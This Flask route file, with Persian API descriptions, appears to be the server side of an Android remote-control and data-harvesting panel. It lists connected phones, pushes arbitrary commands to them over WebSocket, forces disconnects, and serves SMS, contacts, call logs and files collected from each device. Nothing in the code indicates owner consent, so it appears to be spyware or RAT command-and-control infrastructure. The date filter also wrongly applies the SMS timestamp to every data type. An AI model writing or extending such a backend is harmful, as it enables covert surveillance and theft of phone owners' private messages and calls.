from flask import Blueprint, request, jsonify
from flask_jwt_extended import jwt_required, get_jwt_identity
from app import db, socketio
from app.models.device import Device
from app.models.data_collection import DataCollection, Contact, SMS, CallLog
from app.models.command import Command
from app.services.device_service import DeviceService
from app.services.command_service import CommandService
from app.utils.validators import validate_command_data
from app.utils.rate_limit import rate_limit
from app.utils.decorators import admin_required, operator_required
import logging
from flasgger import swag_from

devices_bp = Blueprint('devices', __name__)
logger = logging.getLogger(__name__)

device_service = DeviceService()
command_service = CommandService()

@devices_bp.route('/', methods=['GET'])
@jwt_required()
@rate_limit(limit=100, window=3600)  # 100 requests per hour
@swag_from({
    'tags': ['Devices'],
    'summary': 'Get all devices',
    'description': 'دریافت لیست دستگاه‌ها با امکان فیلتر و صفحه‌بندی',
    'parameters': [
        {
            'name': 'page',
            'in': 'query',
            'type': 'integer',
            'description': 'شماره صفحه',
            'required': False
        },
        {
            'name': 'per_page',
            'in': 'query',
            'type': 'integer',
            'description': 'تعداد آیتم در هر صفحه',
            'required': False
        },
        {
            'name': 'status',
            'in': 'query',
            'type': 'string',
            'enum': ['connected', 'disconnected', 'all'],
            'description': 'وضعیت اتصال',
            'required': False
        },
        {
            'name': 'manufacturer',
            'in': 'query',
            'type': 'string',
            'description': 'سازنده دستگاه',
            'required': False
        },
        {
            'name': 'android_version',
            'in': 'query',
            'type': 'string',
            'description': 'نسخه اندروید',
            'required': False
        }
    ],
    'responses': {
        '200': {
            'description': 'لیست دستگاه‌ها',
            'schema': {
                'type': 'object',
                'properties': {
                    'devices': {
                        'type': 'array',
                        'items': {'type': 'object'}
                    },
                    'pagination': {
                        'type': 'object',
                        'properties': {
                            'page': {'type': 'integer'},
                            'per_page': {'type': 'integer'},
                            'total': {'type': 'integer'},
                            'pages': {'type': 'integer'},
                            'has_next': {'type': 'boolean'},
                            'has_prev': {'type': 'boolean'}
                        }
                    }
                }
            }
        },
        '500': {
            'description': 'Internal server error'
        }
    }
})
def get_devices():
    """Get all devices with optional filtering"""
    try:
        # Get query parameters
        page = request.args.get('page', 1, type=int)
        per_page = min(request.args.get('per_page', 20, type=int), 100)
        status = request.args.get('status')  # connected, disconnected, all
        manufacturer = request.args.get('manufacturer')
        android_version = request.args.get('android_version')
        
        # Build query
        query = Device.query
        
        if status == 'connected':
            query = query.filter_by(is_connected=True)
        elif status == 'disconnected':
            query = query.filter_by(is_connected=False)
        
        if manufacturer:
            query = query.filter(Device.manufacturer.ilike(f'%{manufacturer}%'))
        
        if android_version:
            query = query.filter_by(android_version=android_version)
        
        # Paginate results
        pagination = query.order_by(Device.last_seen.desc()).paginate(
            page=page, per_page=per_page, error_out=False
        )
        
        devices = [device.to_dict() for device in pagination.items]
        
        return jsonify({
            'devices': devices,
            'pagination': {
                'page': page,
                'per_page': per_page,
                'total': pagination.total,
                'pages': pagination.pages,
                'has_next': pagination.has_next,
                'has_prev': pagination.has_prev
            }
        }), 200
        
    except Exception as e:
        logger.error(f'Error getting devices: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@devices_bp.route('/<int:device_id>', methods=['GET'])
@jwt_required()
@rate_limit(limit=200, window=3600)
@swag_from({
    'tags': ['Devices'],
    'summary': 'Get device details',
    'description': 'دریافت اطلاعات کامل یک دستگاه',
    'parameters': [
        {
            'name': 'device_id',
            'in': 'path',
            'type': 'integer',
            'required': True,
            'description': 'شناسه دیتابیس دستگاه'
        }
    ],
    'responses': {
        '200': {
            'description': 'اطلاعات دستگاه',
            'schema': {
                'type': 'object',
                'properties': {
                    'device': {'type': 'object'},
                    'statistics': {'type': 'object'}
                }
            }
        },
        '404': {'description': 'Device not found'},
        '500': {'description': 'Internal server error'}
    }
})
def get_device(device_id):
    """Get specific device details"""
    try:
        device = Device.query.get_or_404(device_id)
        
        # Get device statistics
        stats = device_service.get_device_statistics(device_id)
        
        return jsonify({
            'device': device.to_dict(),
            'statistics': stats
        }), 200
        
    except Exception as e:
        logger.error(f'Error getting device {device_id}: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@devices_bp.route('/<int:device_id>/command', methods=['POST'])
@jwt_required()
@operator_required
@rate_limit(limit=50, window=3600)
@swag_from({
    'tags': ['Devices'],
    'summary': 'Send command to device',
    'description': 'ارسال دستور به دستگاه (فقط اپراتور/ادمین)',
    'parameters': [
        {
            'name': 'device_id',
            'in': 'path',
            'type': 'integer',
            'required': True,
            'description': 'شناسه دیتابیس دستگاه'
        },
        {
            'name': 'body',
            'in': 'body',
            'schema': {
                'type': 'object',
                'properties': {
                    'command_type': {'type': 'string'},
                    'command_data': {'type': 'object'},
                    'priority': {'type': 'string', 'enum': ['low', 'normal', 'high', 'critical']}
                },
                'required': ['command_type']
            }
        }
    ],
    'responses': {
        '200': {
            'description': 'دستور با موفقیت ارسال شد',
            'schema': {
                'type': 'object',
                'properties': {
                    'message': {'type': 'string'},
                    'command_id': {'type': 'integer'},
                    'status': {'type': 'string'}
                }
            }
        },
        '400': {'description': 'Device is not connected or invalid data'},
        '500': {'description': 'Internal server error'}
    }
})
def send_command(device_id):
    """Send command to device"""
    try:
        device = Device.query.get_or_404(device_id)
        
        if not device.is_connected:
            return jsonify({'error': 'Device is not connected'}), 400
        
        data = request.get_json()
        
        if not data:
            return jsonify({'error': 'No command data provided'}), 400
        
        # Validate command data
        validation_result = validate_command_data(data)
        if not validation_result['valid']:
            return jsonify({'error': validation_result['message']}), 400
        
        command_type = data.get('command_type')
        command_data = data.get('command_data', {})
        priority = data.get('priority', 'normal')
        
        # Create command record
        command = Command(
            device_id=device_id,
            command_type=command_type,
            command_data=command_data,
            priority=priority,
            status='pending'
        )
        
        db.session.add(command)
        db.session.commit()
        
        # Send command via WebSocket
        socketio.emit('new_command', {
            'device_id': device.device_id,
            'command_id': command.id,
            'command_type': command_type,
            'command_data': command_data,
            'priority': priority
        }, room=device.device_id)
        
        logger.info(f'Command sent to device {device.device_id}: {command_type}')
        
        return jsonify({
            'message': 'Command sent successfully',
            'command_id': command.id,
            'status': 'pending'
        }), 200
        
    except Exception as e:
        logger.error(f'Error sending command to device {device_id}: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@devices_bp.route('/<int:device_id>/data', methods=['GET'])
@jwt_required()
@rate_limit(limit=100, window=3600)
@swag_from({
    'tags': ['Devices'],
    'summary': 'Get collected data from device',
    'description': 'دریافت داده‌های جمع‌آوری‌شده از دستگاه',
    'parameters': [
        {'name': 'device_id', 'in': 'path', 'type': 'integer', 'required': True, 'description': 'شناسه دیتابیس دستگاه'},
        {'name': 'data_type', 'in': 'query', 'type': 'string', 'description': 'نوع داده (sms, contacts, calls, files, ...)'},
        {'name': 'page', 'in': 'query', 'type': 'integer', 'description': 'شماره صفحه'},
        {'name': 'per_page', 'in': 'query', 'type': 'integer', 'description': 'تعداد آیتم در هر صفحه'},
        {'name': 'start_date', 'in': 'query', 'type': 'string', 'description': 'تاریخ شروع (ISO)'},
        {'name': 'end_date', 'in': 'query', 'type': 'string', 'description': 'تاریخ پایان (ISO)'}
    ],
    'responses': {
        '200': {
            'description': 'داده‌های جمع‌آوری‌شده',
            'schema': {
                'type': 'object',
                'properties': {
                    'data': {'type': 'array', 'items': {'type': 'object'}},
                    'data_type': {'type': 'string'},
                    'pagination': {'type': 'object'}
                }
            }
        },
        '500': {'description': 'Internal server error'}
    }
})
def get_device_data(device_id):
    """Get collected data from device"""
    try:
        device = Device.query.get_or_404(device_id)
        
        # Get query parameters
        data_type = request.args.get('data_type')  # sms, contacts, calls, files, etc.
        page = request.args.get('page', 1, type=int)
        per_page = min(request.args.get('per_page', 50, type=int), 200)
        start_date = request.args.get('start_date')
        end_date = request.args.get('end_date')
        
        # Build query based on data type
        if data_type == 'sms':
            query = SMS.query.filter_by(device_id=device_id)
        elif data_type == 'contacts':
            query = Contact.query.filter_by(device_id=device_id)
        elif data_type == 'calls':
            query = CallLog.query.filter_by(device_id=device_id)
        else:
            # General data collections
            query = DataCollection.query.filter_by(device_id=device_id)
            if data_type:
                query = query.filter_by(data_type=data_type)
        
        # Apply date filters if provided
        if start_date:
            query = query.filter(SMS.created_at >= start_date)
        if end_date:
            query = query.filter(SMS.created_at <= end_date)
        
        # Paginate results
        pagination = query.order_by(SMS.created_at.desc()).paginate(
            page=page, per_page=per_page, error_out=False
        )
        
        data_items = [item.to_dict() for item in pagination.items]
        
        return jsonify({
            'data': data_items,
            'data_type': data_type,
            'pagination': {
                'page': page,
                'per_page': per_page,
                'total': pagination.total,
                'pages': pagination.pages
            }
        }), 200
        
    except Exception as e:
        logger.error(f'Error getting data for device {device_id}: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@devices_bp.route('/<int:device_id>/status', methods=['GET'])
@jwt_required()
@rate_limit(limit=300, window=3600)
@swag_from({
    'tags': ['Devices'],
    'summary': 'Get real-time device status',
    'description': 'دریافت وضعیت لحظه‌ای دستگاه',
    'parameters': [
        {'name': 'device_id', 'in': 'path', 'type': 'integer', 'required': True, 'description': 'شناسه دیتابیس دستگاه'}
    ],
    'responses': {
        '200': {'description': 'وضعیت دستگاه', 'schema': {'type': 'object'}},
        '500': {'description': 'Internal server error'}
    }
})
def get_device_status(device_id):
    """Get real-time device status"""
    try:
        device = Device.query.get_or_404(device_id)
        
        status = {
            'device_id': device.device_id,
            'is_connected': device.is_connected,
            'last_seen': device.last_seen.isoformat() if device.last_seen else None,
            'battery_level': device.battery_level,
            'is_charging': device.is_charging,
            'memory_usage': device.memory_usage,
            'cpu_usage': device.cpu_usage,
            'ip_address': device.ip_address,
            'security_level': device.security_level
        }
        
        return jsonify(status), 200
        
    except Exception as e:
        logger.error(f'Error getting status for device {device_id}: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@devices_bp.route('/<int:device_id>/disconnect', methods=['POST'])
@jwt_required()
@admin_required
@rate_limit(limit=10, window=3600)
@swag_from({
    'tags': ['Devices'],
    'summary': 'Force disconnect device',
    'description': 'قطع اتصال دستگاه توسط ادمین',
    'parameters': [
        {'name': 'device_id', 'in': 'path', 'type': 'integer', 'required': True, 'description': 'شناسه دیتابیس دستگاه'}
    ],
    'responses': {
        '200': {'description': 'دستگاه با موفقیت قطع شد', 'schema': {'type': 'object'}},
        '400': {'description': 'Device is already disconnected'},
        '500': {'description': 'Internal server error'}
    }
})
def disconnect_device(device_id):
    """Force disconnect device"""
    try:
        device = Device.query.get_or_404(device_id)
        
        if not device.is_connected:
            return jsonify({'error': 'Device is already disconnected'}), 400
        
        # Send disconnect command
        socketio.emit('force_disconnect', {
            'device_id': device.device_id,
            'reason': 'Admin request'
        }, room=device.device_id)
        
        # Mark device as disconnected
        device.mark_disconnected()
        db.session.commit()
        
        logger.info(f'Device {device.device_id} force disconnected by admin')
        
        return jsonify({'message': 'Device disconnected successfully'}), 200
        
    except Exception as e:
        logger.error(f'Error disconnecting device {device_id}: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@devices_bp.route('/stats', methods=['GET'])
@jwt_required()
@rate_limit(limit=50, window=3600)
def get_device_stats():
    """Get overall device statistics"""
    try:
        stats = Device.get_device_stats()
        
        # Add additional statistics
        stats.update({
            'android_versions': device_service.get_android_version_distribution(),
            'manufacturers': device_service.get_manufacturer_distribution(),
            'security_levels': device_service.get_security_level_distribution(),
            'connection_history': device_service.get_connection_history()
        })
        
        return jsonify(stats), 200
        
    except Exception as e:
        logger.error(f'Error getting device stats: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@devices_bp.route('/search', methods=['GET'])
@jwt_required()
@rate_limit(limit=100, window=3600)
def search_devices():
    """Search devices by various criteria"""
    try:
        query = request.args.get('q', '')
        search_type = request.args.get('type', 'all')  # all, name, manufacturer, model
        
        if not query:
            return jsonify({'error': 'Search query is required'}), 400
        
        devices_query = Device.query
        
        if search_type == 'name':
            devices_query = devices_query.filter(Device.device_name.ilike(f'%{query}%'))
        elif search_type == 'manufacturer':
            devices_query = devices_query.filter(Device.manufacturer.ilike(f'%{query}%'))
        elif search_type == 'model':
            devices_query = devices_query.filter(Device.model.ilike(f'%{query}%'))
        else:
            # Search in all fields
            devices_query = devices_query.filter(
                db.or_(
                    Device.device_name.ilike(f'%{query}%'),
                    Device.manufacturer.ilike(f'%{query}%'),
                    Device.model.ilike(f'%{query}%'),
                    Device.device_id.ilike(f'%{query}%')
                )
            )
        
        devices = devices_query.limit(20).all()
        
        return jsonify({
            'devices': [device.to_dict() for device in devices],
            'query': query,
            'type': search_type,
            'count': len(devices)
        }), 200
        
    except Exception as e:
        logger.error(f'Error searching devices: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500 